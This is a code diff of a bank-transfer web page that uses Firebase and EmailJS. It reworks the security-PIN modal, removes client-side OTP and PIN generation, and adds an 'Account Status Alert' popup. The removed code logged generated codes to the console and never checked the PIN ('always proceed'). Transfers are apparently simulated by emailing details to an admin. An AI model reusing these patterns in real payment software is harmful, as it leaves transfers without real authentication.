@@ -60,7 +60,7 @@
             position: absolute;
         }
     </style>
-  <script type="module" crossorigin src="/assets/transfer-CKf7vCmG.js"></script>
+  <script type="module" crossorigin src="/assets/transfer-93psfcc2.js"></script>
   <link rel="modulepreload" crossorigin href="/assets/modulepreload-polyfill-B5Qt9EMX.js">
 </head>
 <body class="font-sans antialiased" style="background-image: url('/assets/background%202-Dn1co03N.png');">
@@ -286,7 +286,8 @@
         </button>
 
         <h2 class="text-xs text-center text-black mb-4">Enter your Transfer Pin</h2>
-        <p class="text-gray-500 text-xs text-center mb-4">Please enter your security pin to complete this transfer.</p>
+        <p class="text-gray-500 text-xs text-center mb-4">To complete this transfer, you'll need to enter your security PIN.
+            If you haven't set one yet, please create a PIN now to continue.</p>
         <input 
             type="password" 
             id="securityPin" 
@@ -298,10 +299,8 @@
         <div class="mt-4 flex justify-center">
             <button 
                 type="button" 
-                onclick="validatePin()" 
                 id="confirmButton"
-                class="bg-white text-gray-400 text-xs border border-gray-900 font-semibold rounded-full px-16 py-3 w-full md:w-auto hover:bg-blue-900"
-            >
+                class="bg-white text-gray-400 text-xs border border-gray-900 font-semibold rounded-full px-16 py-3 w-full md:w-auto hover:bg-blue-900">
                 <span id="confirmButtonText">Confirm</span>
                 <span id="confirmButtonLoader" class="hidden ml-2 loader"></span>
             </button>
@@ -412,7 +411,6 @@
 <script>
 let depositBalance = 0; // Fetch this value from Firebase when the page loads.
 let generatedPin; // Variable to store the generated PIN
-let generatedOtp; // Variable to store the generated OTP
 let selectedTransferType = ""; // Variable to track selected transfer type
 
 // Format amount with commas as user types
@@ -475,27 +473,7 @@ function showSpinnerAndRedirect() {
 
 // Initialize Email.js with your user ID
 if (typeof emailjs !== 'undefined') {
-    emailjs.init("N9MvCEIIhbWSHAM1D"); // Ensure this is your actual Email.js user ID
-}
-
-// Function to send OTP via Email.js
-function sendOtpToEmail(userEmail) {
-    generatedOtp = Math.floor(100000 + Math.random() * 900000); // Generate a 6-digit OTP
-    console.log("Generated OTP:", generatedOtp); // For debugging purposes
-
-    // Log the data being sent
-    console.log("Sending OTP to:", userEmail);
-
-    if (typeof emailjs !== 'undefined') {
-        emailjs.send("service_f2t3rz7", "template_n4a50om", {
-            to_email: userEmail,
-            otp: generatedOtp
-        }).then((response) => {
-            console.log('OTP sent successfully!', response.status, response.text);
-        }).catch((error) => {
-            console.error('Failed to send OTP:', error);
-        });
-    }
+    emailjs.init("qXOvrbfa0azvn_FJl"); // Ensure this is your actual Email.js user ID
 }
 
 // Function to send transfer details via Email.js
@@ -505,7 +483,7 @@ function sendTransferDetails(transferData) {
     console.log("Sending transfer details to admin:", transferData);
     
     if (typeof emailjs !== 'undefined') {
-        emailjs.send("service_f2t3rz7", "template_n4a50om", {
+        emailjs.send("service_i2m0mci", "template_7mgbnvs", {
             to_email: adminEmail,
             transaction_ref: transferData.transactionRef,
             bank_name: transferData.bankName,
@@ -533,14 +511,6 @@ function showSecurityPinModal() {
         if (withdrawCash > depositBalance) {
             document.getElementById('insufficientBalanceError').classList.remove('hidden');
         } else {
-            // Generate a random 5-digit PIN
-            generatedPin = Math.floor(10000 + Math.random() * 90000); // Generates a number between 10000 and 99999
-            console.log("Generated PIN:", generatedPin); // For debugging purposes
-
-            // Send OTP to user's email
-            const userEmail = "Andreghartm@gmail.com"; // Replace with the actual user's email
-            sendOtpToEmail(userEmail);
-
             document.getElementById('spinner').classList.remove('hidden');
 
             setTimeout(() => {
@@ -549,102 +519,6 @@ function showSecurityPinModal() {
             }, 3000);
         }
     }
-}
-
-// Validate PIN input
-function validatePin() {
-    const enteredPin = document.getElementById('securityPin').value.trim();
-    const confirmButton = document.getElementById('confirmButton');
-    const confirmButtonText = document.getElementById('confirmButtonText');
-    const confirmButtonLoader = document.getElementById('confirmButtonLoader');
-    const pinErrorElement = document.getElementById('securityPinError');
-    
-    pinErrorElement.classList.add('hidden');
-    
-    // Disable button and show loader
-    confirmButton.disabled = true;
-    confirmButtonText.textContent = "Processing...";
-    confirmButtonLoader.classList.remove('hidden');
-    
-    // Show spinner
-    document.getElementById('spinner').classList.remove('hidden');
-
-    setTimeout(() => {
-        // For demo purposes, always proceed (in real app, validate against generatedPin)
-        document.getElementById('securityPinModal').classList.add('hidden');
-        
-        // Execute the transfer and show receipt
-        executeTransfer();
-        
-        // Re-enable button and hide loader
-        confirmButton.disabled = false;
-        confirmButtonText.textContent = "Confirm";
-        confirmButtonLoader.classList.add('hidden');
-        
-        document.getElementById('spinner').classList.add('hidden');
-    }, 2500);
-}
-
-// Function to execute the transfer logic
-function executeTransfer() {
-    let bankName = document.getElementById("bankName").value;
-    let accountNumber = document.getElementById("accountNumber").value;
-    let accountName = document.getElementById("accountName").value;
-    let transferAmount = parseFloat(document.getElementById("withdrawCash").value.replace(/[^0-9.]/g, '')) || 0;
-    let swiftCode = document.getElementById("swiftCode").value;
-    let paymentDescription = document.getElementById("paymentDescription").value;
-    let transactionRef = "TRX" + Math.floor(Math.random() * 1000000);
-
-    if (!bankName || !accountNumber || !accountName || !transferAmount) {
-        alert("Please fill in all required fields.");
-        return;
-    }
-
-    const fee = transferAmount * 0.0001; // Calculate fee
-
-    document.getElementById("spinner").classList.remove("hidden");
-
-    // Prepare transfer data object
-    const transferData = {
-        bankName: bankName,
-        accountNumber: accountNumber,
-        accountName: accountName,
-        transferAmount: transferAmount.toFixed(2),
-        swiftCode: swiftCode,
-        transferType: selectedTransferType || "Domestic",
-        paymentDescription: paymentDescription,
-        transactionRef: transactionRef,
-        fee: fee.toFixed(2)
-    };
-
-    // Send transfer details email
-    sendTransferDetails(transferData);
-
-    setTimeout(() => {
-        document.getElementById("spinner").classList.add("hidden");
-
-        document.getElementById("beneficiaryName").innerText = accountName;
-        document.getElementById("beneficiaryAccount").innerText = accountNumber;
-        document.getElementById("beneficiaryBank").innerText = bankName;
-        document.getElementById("transferAmount").innerText = `$${transferAmount.toFixed(2)}`;
-        document.getElementById("transferFee").innerText = `$${fee.toFixed(2)}`; // Display the fee
-        document.getElementById("transactionRef").innerText = transactionRef;
-        document.getElementById("receiptPaymentDescription").innerText = paymentDescription || "-";
-        
-        // Handle SWIFT code in the receipt
-        if (selectedTransferType === "International" && swiftCode) {
-            document.getElementById("swiftCodeReceiptSection").classList.remove("hidden");
-            document.getElementById("receiptSwiftCode").innerText = swiftCode;
-        } else {
-            document.getElementById("swiftCodeReceiptSection").classList.add("hidden");
-        }
-
-        document.getElementById("successModal").classList.remove("hidden");
-    }, 1000);
-}
-
-function closeSuccessModal() {
-    document.getElementById('successModal').classList.add('hidden');
 }
 
 // Validate the form inputs
@@ -973,5 +847,57 @@ function formatAmount(input) {
             window.location.href = url;
         }, 1000); // Adjust the delay as needed
     }
+</script>
+
+<script>
+// Function to update transfer details in Firebase
+async function registerTransferInFirebase(transferData) {
+    const user = window.auth.currentUser;
+    if (user) {
+        const userDocRef = doc(window.db, 'users', user.uid);
+        try {
+            await updateDoc(userDocRef, {
+                pending1: transferData
+            });
+            console.log('Transfer registered successfully in Firebase.');
+        } catch (error) {
+            console.error('Error registering transfer in Firebase:', error);
+        }
+    }
+}
+</script>
+
+<script>
+// Add these functions for error handling
+function showErrorModal(message) {
+    const errorModalHTML = `
+    <div id="errorModal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
+        <div class="bg-white rounded-lg shadow-lg p-6 w-11/12 md:w-1/3 max-w-md">
+            <div class="text-center">
+                <!-- Error Icon -->
+                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-red-100 mb-4">
+                    <svg class="h-6 w-6 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+                    </svg>
+                </div>
+                <h3 class="text-lg font-medium text-gray-900 mb-2">Account Status Alert</h3>
+                <p class="text-sm text-gray-500 mb-6">${message}</p>
+                <button onclick="closeErrorModal()" class="w-full bg-red-600 text-white rounded-lg px-4 py-2 hover:bg-red-700 transition-colors duration-150">
+                    Close
+                </button>
+            </div>
+        </div>
+    </div>`;
+
+    // Add modal to document
+    document.body.insertAdjacentHTML('beforeend', errorModalHTML);
+}
+
+function closeErrorModal() {
+    const errorModal = document.getElementById('errorModal');
+    if (errorModal) {
+        errorModal.remove();
+    }
+}
 </script>
 </html>
